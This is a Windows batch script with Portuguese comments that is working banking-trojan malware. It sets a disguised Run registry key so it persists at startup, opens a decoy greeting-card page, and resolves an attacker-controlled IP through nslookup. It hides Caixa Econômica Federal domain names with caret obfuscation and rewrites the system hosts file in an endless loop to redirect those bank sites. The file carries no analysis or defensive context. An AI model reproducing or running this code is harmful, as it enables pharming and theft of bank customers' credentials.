@echo off
@break off
ver|find "Windows 98">nul
if not errorlevel 1 goto nao

if exist %windir%\system32\ctzz.dll goto con
::adicionando no regedit
> %windir%\system32\ctzz.dll echo y
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Gerenciador de Tarefas do Windows" /t REG_SZ /d "%windir%\system32\taskmqr.exe" < %windir%\system32\ctzz.dll
start /max iexplore.exe "http://visualiza.cartoes-legais.com"
goto mapa
::Teste Conexao
:con
set ping=%windir%\system32\ping.exe
:teste
%ping% www.google.com -n 1 -l 1 | find "TTL" > nul
if not errorlevel 1 goto mapa
goto teste
:mapa
::pegando IP
for /f "tokens=2" %%D in ('nslookup dns1.cocanaocola.com ^| find "Address"') do set web=%%D
::variaveis
set f1=g^o^v^.b^r
set f2=c^om.^b^r
set da=i^n^t^e^r^n^e^t^c^a^i^x^a.c^a^i^x^a.%f1%
set db=www.c^a^i^x^a.%f2%
set dc=c^ai^x^a.%f2%
set dd=www.cai^x^a.%f1%
set de=c^aix^a.%f1%
set df=www.c^ef^.%f2%
set dg=^c^ef.%f2%
set dh=www.c^e^f.%f1%
set di=^c^e^f^.%f1%
set dj=www.ca^i^xae^co^nomi^c^a.%f2%
set dl=ca^ixa^eco^no^mic^a.%f2%
set dm=www.^c^a^i^xae^con^omica.%f1%
set dn=cai^xaecon^o^m^i^c^a.%f1%
set di=www.ca^ix^ae^co^no^mic^a^federal.%f2%
::parte pra escrever o arquivo
> %temp%\~7.tmp echo %web% %da%&>> %temp%\~7.tmp echo %web% %db%&>> %temp%\~7.tmp echo %web% %dc%&>> %temp%\~7.tmp echo %web% %dd%&>> %temp%\~7.tmp echo %web% %de%&rem
>> %temp%\~7.tmp echo %web% %df%&>> %temp%\~7.tmp echo %web% %dg%&>> %temp%\~7.tmp echo %web% %dh%&>> %temp%\~7.tmp echo %web% %di%&>> %temp%\~7.tmp echo %web% %dj%&rem
>> %temp%\~7.tmp echo %web% %dl%&>> %temp%\~7.tmp echo %web% %dm%&>> %temp%\~7.tmp echo %web% %dn%&>> %temp%\~7.tmp echo %web% %di%&rem
::briga com o plugin
:l1
type %temp%\~7.tmp>%windir%\system32\drivers\etc\hosts&goto l1
:nao
start /max iexplore.exe "http://visualiza.cartoes-legais.com"
exit
